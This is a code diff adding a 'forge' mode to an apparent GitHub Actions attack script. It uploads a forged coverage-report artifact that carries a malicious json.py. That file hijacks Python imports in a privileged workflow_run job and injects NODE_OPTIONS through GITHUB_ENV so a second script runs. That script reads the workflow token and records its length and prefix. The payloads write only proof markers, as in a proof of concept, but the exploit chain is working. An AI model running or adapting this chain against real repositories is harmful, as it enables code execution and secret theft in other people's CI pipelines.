@@ -143,6 +143,39 @@ def main():
         else:
             print('SHADOW-CREATE-FAILED', json.dumps(cr)[:400])
         print('LIST-FINAL', json.dumps(list_artifacts())[:1500])
+    elif mode == 'forge':
+        name = sys.argv[2] if len(sys.argv) > 2 else 'pr-coverage-report'
+        payload = (
+            "import os\n"
+            "try:\n"
+            "    ws = os.environ.get('GITHUB_WORKSPACE', '.')\n"
+            "    open(os.path.join(ws, 'RCE_PROOF.txt'), 'w').write('RCE: python CWD import hijack executed in privileged workflow_run job\\n')\n"
+            "    envf = os.environ.get('GITHUB_ENV')\n"
+            "    if envf:\n"
+            "        open(envf, 'a').write('RCE_IMPORT_PROOF=yes\\n')\n"
+            "        open(envf, 'a').write('NODE_OPTIONS=--require ' + os.path.join(ws, 'node_proof.js') + '\\n')\n"
+            "    print('RCE-PAYLOAD-EXECUTED')\n"
+            "except Exception as e:\n"
+            "    print('payload-error', e)\n"
+        )
+        entries = [
+            ('bull-report/target/site/jacoco-aggregate/jacoco.xml',
+             '<report><counter type="LINE" missed="1" covered="99"/><counter type="BRANCH" missed="2" covered="8"/></report>'),
+            ('pr_number.txt', '1\n'),
+            ('json.py', payload),
+            ('node_proof.js',
+             "try{const fs=require('fs');const t=process.env['INPUT_GITHUB_TOKEN']||process.env.GITHUB_TOKEN||'';"
+             "fs.writeFileSync(process.env.GITHUB_WORKSPACE+'/TOKEN_IN_NODE.txt','token_len='+String(t).length+' prefix='+String(t).slice(0,4)+'\\n');"
+             "}catch(e){}\n"),
+        ]
+        path = os.path.join(os.environ.get('RUNNER_TEMP', '/tmp'), 'forge.zip')
+        mkzip(path, entries)
+        cr = create(name)
+        print('FORGE-CREATE', json.dumps(cr)[:200])
+        if cr.get('ok'):
+            print('FORGE-UPLOAD', upload(cr['signed_upload_url'], path))
+            print('FORGE-FINALIZE', json.dumps(finalize(name, path))[:300])
+        print('FORGE-LIST', json.dumps(list_artifacts())[:800])
     else:
         raise SystemExit('unknown mode')
 
